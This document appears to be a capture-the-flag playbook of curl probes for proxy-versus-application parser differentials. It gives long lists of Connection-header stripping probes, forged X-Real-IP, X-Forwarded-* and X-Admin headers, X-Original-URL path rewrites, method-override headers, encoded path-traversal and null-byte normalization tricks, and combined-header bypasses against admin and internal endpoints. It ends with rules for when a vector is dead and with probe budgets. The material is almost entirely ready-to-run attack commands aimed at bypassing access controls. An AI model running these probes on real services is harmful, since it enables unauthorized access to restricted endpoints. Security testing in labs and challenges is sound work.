# Per-vector deep — every parser-differential vector, exhaustively

The vector map — a header the app reads, a check the header gates.

---

## 1. The hop-by-hop strip — the Connection-header names

```bash
# naming the proxy's own header in Connection — the strip probes
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Real-IP'   # the proxy's client-IP header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-For'   # the forwarded header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Host'   # the forwarded host
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Proto'   # the forwarded proto
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Scheme'   # the forwarded scheme
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-User'   # the forwarded user
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Email'   # the forwarded email
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Server'   # the forwarded server
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Port'   # the forwarded port
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Path'   # the forwarded path
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Prefix'   # the forwarded prefix
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Client-IP'   # the client-IP header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, True-Client-IP'   # the true-client-IP header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, Forwarded'   # the RFC 7239 Forwarded header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Internal'   # the internal header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Admin'   # the admin header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Debug'   # the debug header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Original-URL'   # the original-URL header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Rewrite-URL'   # the rewrite-URL header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Original-Path'   # the original-path header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Real-Path'   # the real-path header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-HTTP-Method-Override'   # the method-override header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Original-Method'   # the original-method header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-HTTP-Method'   # the HTTP-method header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Method-Override'   # the method-override header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, Authorization'   # the auth header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Host'   # the X-Host header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Server'   # the forwarded-server header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Port'   # the forwarded-port header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Path'   # the forwarded-path header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Prefix'   # the forwarded-prefix header
```

## 2. The client-supplied bypass — a forged proxy-header

```bash
# a client-supplied proxy header — a forged header
curl "$BASE/api/admin" -H 'X-Real-IP: 127.0.0.1'   # a forged local IP
curl "$BASE/api/admin" -H 'X-Real-IP: ::1'   # a forged localhost
curl "$BASE/api/admin" -H 'X-Real-IP: 10.0.0.1'   # a forged internal IP
curl "$BASE/api/admin" -H 'X-Forwarded-For: 127.0.0.1'   # a forged local IP
curl "$BASE/api/admin" -H 'X-Forwarded-For: ::1'   # a forged localhost
curl "$BASE/api/admin" -H 'X-Forwarded-For: 10.0.0.1'   # a forged internal IP
curl "$BASE/api/admin" -H 'X-Forwarded-For: 127.0.0.1, 8.8.8.8'   # a chained forwarded
curl "$BASE/api/admin" -H 'X-Client-IP: 127.0.0.1'   # a forged client-IP
curl "$BASE/api/admin" -H 'X-Client-IP: ::1'   # a forged localhost
curl "$BASE/api/admin" -H 'True-Client-IP: 127.0.0.1'   # a forged true-client-IP
curl "$BASE/api/admin" -H 'True-Client-IP: ::1'   # a forged localhost
curl "$BASE/api/admin" -H 'Forwarded: for=127.0.0.1'   # a forged RFC 7239
curl "$BASE/api/admin" -H 'Forwarded: for=::1'   # a forged localhost
curl "$BASE/api/admin" -H 'Forwarded: for=127.0.0.1;host=attacker.com;proto=http'   # a chained forwarded
curl "$BASE/api/admin" -H 'X-Forwarded-Host: attacker.com'   # a forged host
curl "$BASE/api/admin" -H 'X-Forwarded-Host: target.com'   # a forged same-host
curl "$BASE/api/admin" -H 'X-Forwarded-Host: 127.0.0.1'   # a forged localhost
curl "$BASE/api/admin" -H 'X-Host: attacker.com'   # a forged X-Host
curl "$BASE/api/admin" -H 'X-Host: target.com'   # a forged same-host
curl "$BASE/api/admin" -H 'X-Forwarded-Proto: http'   # a forged proto
curl "$BASE/api/admin" -H 'X-Forwarded-Proto: https'   # a forged https
curl "$BASE/api/admin" -H 'X-Forwarded-Scheme: http'   # a forged scheme
curl "$BASE/api/admin" -H 'X-Forwarded-Scheme: https'   # a forged https
curl "$BASE/api/admin" -H 'X-Internal: true'   # a forged internal flag
curl "$BASE/api/admin" -H 'X-Internal: 1'   # a forged internal flag
curl "$BASE/api/admin" -H 'X-Internal: yes'   # a forged internal flag
curl "$BASE/api/admin" -H 'X-Admin: true'   # a forged admin flag
curl "$BASE/api/admin" -H 'X-Admin: 1'   # a forged admin flag
curl "$BASE/api/admin" -H 'X-Admin: yes'   # a forged admin flag
curl "$BASE/api/admin" -H 'X-Debug: true'   # a forged debug flag
curl "$BASE/api/admin" -H 'X-Debug: 1'   # a forged debug flag
curl "$BASE/api/admin" -H 'X-Debug: yes'   # a forged debug flag
curl "$BASE/api/admin" -H 'X-Forwarded-User: admin'   # a forged user
curl "$BASE/api/admin" -H 'X-Forwarded-User: root'   # a forged root
curl "$BASE/api/admin" -H 'X-Forwarded-User: user'   # a forged user
curl "$BASE/api/admin" -H 'X-Forwarded-Email: admin@target.com'   # a forged email
curl "$BASE/api/admin" -H 'X-Forwarded-Email: user@target.com'   # a forged user
curl "$BASE/api/admin" -H 'X-Forwarded-Server: 127.0.0.1'   # a forged server
curl "$BASE/api/admin" -H 'X-Forwarded-Server: internal'   # a forged internal server
curl "$BASE/api/admin" -H 'X-Forwarded-Server: localhost'   # a forged localhost
curl "$BASE/api/admin" -H 'X-Forwarded-Port: 80'   # a forged port
curl "$BASE/api/admin" -H 'X-Forwarded-Port: 443'   # a forged port
curl "$BASE/api/admin" -H 'X-Forwarded-Port: 8080'   # a forged port
```

## 3. The path-rewrite — a rewritten path

```bash
# a client-supplied path-rewrite — a rewritten path
curl "$BASE/page" -H 'X-Original-URL: /admin'   # a forged path
curl "$BASE/page" -H 'X-Original-URL: /internal'   # a forged internal path
curl "$BASE/page" -H 'X-Original-URL: /private'   # a forged private path
curl "$BASE/page" -H 'X-Rewrite-URL: /admin'   # a forged rewrite-URL
curl "$BASE/page" -H 'X-Rewrite-URL: /internal'   # a forged internal rewrite-URL
curl "$BASE/page" -H 'X-Forwarded-Path: /admin'   # a forged forwarded-path
curl "$BASE/page" -H 'X-Forwarded-Path: /internal'   # a forged internal forwarded-path
curl "$BASE/page" -H 'X-Forwarded-Prefix: /admin'   # a forged forwarded-prefix
curl "$BASE/page" -H 'X-Forwarded-Prefix: /internal'   # a forged internal forwarded-prefix
curl "$BASE/page" -H 'X-Original-Path: /admin'   # a forged original-path
curl "$BASE/page" -H 'X-Original-Path: /internal'   # a forged internal original-path
curl "$BASE/page" -H 'X-Real-Path: /admin'   # a forged real-path
curl "$BASE/page" -H 'X-Real-Path: /internal'   # a forged internal real-path
```

## 4. The method-override — a forged method

```bash
# a client-supplied method-override — a forged method
curl "$BASE/api" -H 'X-HTTP-Method-Override: DELETE' -d 'data'   # a forged method
curl "$BASE/api" -H 'X-HTTP-Method-Override: PUT' -d 'data'   # a forged PUT
curl "$BASE/api" -H 'X-HTTP-Method-Override: PATCH' -d 'data'   # a forged PATCH
curl "$BASE/api" -H 'X-HTTP-Method-Override: OPTIONS' -d 'data'   # a forged OPTIONS
curl "$BASE/api" -H 'X-Original-Method: DELETE' -d 'data'   # a forged original-method
curl "$BASE/api" -H 'X-Original-Method: PUT' -d 'data'   # a forged PUT
curl "$BASE/api" -H 'X-Original-Method: PATCH' -d 'data'   # a forged PATCH
curl "$BASE/api" -H 'X-HTTP-Method: DELETE' -d 'data'   # a forged HTTP-method
curl "$BASE/api" -H 'X-HTTP-Method: PUT' -d 'data'   # a forged PUT
curl "$BASE/api" -H 'X-HTTP-Method: PATCH' -d 'data'   # a forged PATCH
curl "$BASE/api" -H 'X-Method-Override: DELETE' -d 'data'   # a forged method-override
curl "$BASE/api" -H 'X-Method-Override: PUT' -d 'data'   # a forged PUT
curl "$BASE/api" -H 'X-Method-Override: PATCH' -d 'data'   # a forged PATCH
```

## 5. The normalization — a path the two parse differently

```bash
# a normalization check — a path the proxy and the app normalize differently
curl "$BASE/static/../admin"   # a traversal boundary
curl "$BASE/%2e%2e/admin"   # an encoded traversal
curl "$BASE/static/%2e%2e/admin"   # a mixed-encoding traversal
curl "$BASE/%61dmin"   # an encoded 'a' — a case/encoding boundary
curl "$BASE/%2fadmin"   # an encoded '/'
curl "$BASE/%252e%252e/admin"   # a doubly-encoded traversal
curl "$BASE/page//admin"   # a double-slash boundary
curl "$BASE/page./admin"   # a dot-slash boundary
curl "$BASE/%2f/admin"   # a leading-encoded-slash boundary
curl "$BASE/admin%20"   # a trailing-space boundary
curl "$BASE/admin%09"   # a trailing-tab boundary
curl "$BASE/admin%00"   # a trailing-null boundary
curl "$BASE/admin?"   # a trailing-? boundary
curl "$BASE/admin#"   # a trailing-# boundary
curl "$BASE/admin.html"   # a trailing-extension boundary
curl "$BASE/admin.css"   # a trailing-extension boundary
curl "$BASE/admin.js"   # a trailing-extension boundary
curl "$BASE/admin.json"   # a trailing-extension boundary
curl "$BASE/admin.xml"   # a trailing-extension boundary
curl "$BASE/admin.txt"   # a trailing-extension boundary
```

## 6. The multi-header bypass — a combined injection

```bash
# a multi-header bypass — a combined injection
curl "$BASE/api/internal" -H 'X-Real-IP: 127.0.0.1' -H 'X-Internal: true'   # a local + an internal
curl "$BASE/api/admin" -H 'X-Real-IP: 127.0.0.1' -H 'X-Admin: true'   # a local + an admin
curl "$BASE/api/user" -H 'X-Real-IP: 127.0.0.1' -H 'X-Forwarded-User: admin'   # a local + a user
curl "$BASE/api/debug" -H 'X-Real-IP: 127.0.0.1' -H 'X-Debug: true'   # a local + a debug
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Proto: http'   # a host + a scheme
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Scheme: http'   # a host + a scheme
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-User: admin'   # a host + a user
curl "$BASE/api" -H 'X-Forwarded-Proto: http' -H 'X-Forwarded-Scheme: http'   # a proto + a scheme
curl "$BASE/api" -H 'X-Real-IP: 127.0.0.1' -H 'X-Forwarded-For: 127.0.0.1'   # a local + a local
curl "$BASE/api" -H 'X-Real-IP: 127.0.0.1' -H 'X-Forwarded-For: ::1'   # a local + a localhost
curl "$BASE/api" -H 'X-Forwarded-User: admin' -H 'X-Forwarded-Email: admin@target.com'   # a user + an email
```

## 7. The multi-proxy differential — a chained normalization

```bash
# a multi-proxy chain — a header each strips differently
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the edge strips it; the origin doesn't
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # a chained normalization
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # a chained user differential
curl "$BASE/page" -H 'X-Forwarded-Email: admin@target.com'   # a chained email differential
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # a chained server differential
curl "$BASE/page" -H 'X-Forwarded-Port: 8080'   # a chained port differential
```

## 8. The per-vector falsifier — when the vector is dead

```text
a proxy that doesn't strip its own header → the hop-by-hop bypass fails
a proxy that strips a client-supplied header → the client-supplied
  bypass fails → the hop-by-hop bypass is the vector
a proxy that verifies the header it added → the client-supplied bypass
  fails → the hop-by-hop bypass is the vector
a non-header check → a different class
the proxy and the app normalize the same way → no confusion
a stored copy → a cache-poisoning
a desync → a request-smuggling
a session check → an auth-session
a host check → a host-header
a fetch → an ssrf
a read → a cors
```

## 9. The per-vector budget — the probe limits

```text
5 probes or 15 minutes per mechanism class; 25 probes or 45 minutes
for the challenge. a spent budget → escalate: chain_match → reclassify
→ writeup_search → novel_plan → fanout_sweep → solver_handoff.
```
